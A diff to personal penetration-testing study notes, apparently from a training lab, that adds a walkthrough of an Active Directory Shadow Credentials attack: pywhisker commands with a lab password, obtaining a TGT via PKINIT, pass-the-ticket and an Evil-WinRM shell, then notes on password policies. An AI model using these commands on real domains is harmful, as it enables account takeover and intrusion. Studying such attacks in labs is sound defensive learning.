@@ -3123,6 +3123,7 @@ python3 -m venv .venv
 source .venv/bin/activate
 pip3 install -r requirements.txt
 ```
+
 Then, we can begin the attack.
 
 >[!Note]
@@ -3148,3 +3149,37 @@ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrat
 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
 
 We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:
+
+```shell
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+```
+
+In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:
+
+```shell
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+```
+
+With the TGT obtained, we may once again `pass the ticket`:
+
+```shell
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist
+```
+
+In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):
+
+```shell
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
+## No PKINIT?
+
+In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights).
+## I DO NOT UNDERSTAND THIS TOPIC
+---
+# Password Policies
+
+Now that we have worked through numerous ways to capture credentials and passwords, let us turn our attention to best practices for password and identity protection. Speed limits and traffic laws exist so that we drive safely. Without them, driving would be chaotic. The same is true when a company does not have proper policies in place; users could act without constraints regardless of the consequences. This is why service providers and administrators define and enforce policies for better security.
+## Creating a strong password
+
+Creating a strong password doesn't have to be difficult. Tools like [PasswordMonster](https://www.passwordmonster.com/) help evaluate the strength of passwords, while [1Password Password Generator](https://1password.com/password-generator/) can generate secure ones.
